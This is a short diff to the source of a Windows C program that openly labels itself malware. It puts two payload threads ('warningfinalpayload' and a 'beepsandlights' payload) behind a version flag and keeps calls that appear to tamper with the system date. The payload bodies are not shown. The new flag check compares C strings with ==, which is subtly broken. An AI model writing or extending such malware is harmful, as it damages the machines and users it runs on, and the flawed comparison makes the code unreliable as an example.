@@ -30,6 +30,7 @@
 #include <wininet.h>
 #pragma comment(lib,"Wininet.lib")
 
+#define VERSIONCOMP "next" // "bruh" for bruh version behavior
 
 /*------------------------------------------------+
 | Arguments payload (Used for development)        |
@@ -518,8 +519,10 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
 
 
     malware:          
-        CreateThread(NULL, 4096, &warningfinalpayload, NULL, NULL, NULL);
-        CreateThread(NULL, NULL, &payloadThread, &beepsandlights, NULL, NULL);
+        if (VERSIONCOMP == "bruh") {
+            CreateThread(NULL, 4096, &warningfinalpayload, NULL, NULL, NULL);
+            CreateThread(NULL, NULL, &payloadThread, &beepsandlights, NULL, NULL);
+        }
 
         NoUnwanted1();
         SetTimeDate();
